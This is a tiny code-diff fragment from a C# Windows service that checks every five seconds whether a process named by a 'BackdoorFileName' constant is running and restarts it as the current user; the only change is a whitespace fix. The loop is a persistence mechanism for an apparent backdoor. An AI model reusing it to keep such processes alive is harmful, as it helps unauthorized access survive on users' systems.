@@ -20,7 +20,7 @@ namespace LBService {
                     const string path = Constants.InstallPath + "/" + Constants.BackdoorFileName;
                     bool doesProcessExist = Process.GetProcessesByName(Constants.BackdoorFileName
                         .Replace(".exe", "")).Length > 0;
-                    if(!doesProcessExist) ServiceProcess.StartProcessAsCurrentUser(path);
+                    if (!doesProcessExist) ServiceProcess.StartProcessAsCurrentUser(path);
 
                     await Task.Delay(5000);
                 }
